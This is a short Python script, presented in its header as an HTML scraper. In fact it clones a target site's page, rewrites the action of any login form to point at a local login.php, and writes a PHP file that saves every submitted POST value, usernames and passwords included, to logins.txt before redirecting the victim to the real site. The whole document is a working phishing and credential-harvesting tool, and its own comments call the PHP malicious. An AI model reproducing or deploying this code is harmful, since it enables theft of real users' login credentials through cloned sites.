#!/usr/bin/env python

#
# This function uses Splinter to scrape a given page's HTML, and
# writes out the HTML to a specified file.
#
# Dane Fichter - 10/11/14

import re
import sys
import codecs
from splinter import Browser

def main():

  if len(sys.argv) != 3:
    print "USAGE: python htmlscraper.py <URL> <OUTPUT FILE>"
    sys.exit(1)

  #list of likely names for a login form#
  likely_names = ["login", "log_in"]

  #load up the desired page and save the html#
  with Browser() as browser:
    url = sys.argv[1]
    server_dir = sys.argv[2]
    browser.visit(url)
    html_string = browser.html

    #use regexes to replace login html form#
    #with our custom login tag#
    print "Searching for login forms..."

    for i in range(len(likely_names)):
      
      #format regexes to match a login form and an action tag#
      #build replacement string and change the html to insert reference to our malicious php#
      login_search_str = "<form.*?id\=.*?\""+likely_names[i]+".*?\".*?>"
      action_search_str = "action.*?\=.*?\".*?\""
      print "Checking regex: "+login_search_str+"\n"
      matches = re.findall(login_search_str, html_string)

      if(len(matches) >= 1):
        print "Found login form(s), replacing action tag(s)"
        
	for j in range(len(matches)):
          replacement_tag = matches[j]
          replacement_tag = re.sub(action_search_str, "action=\"login.php\"", replacement_tag)
          print replacement_tag
          html_string = re.sub(login_search_str, replacement_tag, html_string)

    #dump the html to file#
    f = codecs.open(server_dir+"index.html", encoding="utf-8", mode="w")
    f.write(html_string)
    f.close()

    #format our malicious php, write it out to a file#
    php_file = codecs.open(server_dir+"login.php", encoding="utf-8", mode="w")
    php_str = '<?PHP if(!empty($_POST)){ ob_start(); var_dump($_POST); $str = ob_get_clean(); $fname = "logins.txt"; $file = fopen($fname, "w") or die("Failed to log-in"); fwrite($file, $str); fclose($file); } else { echo("POST IS EMPTY!"); } header("Location: ' + url + '"); ?>'
    php_file.write(php_str)
    php_file.close()

if __name__ == '__main__':
  main()
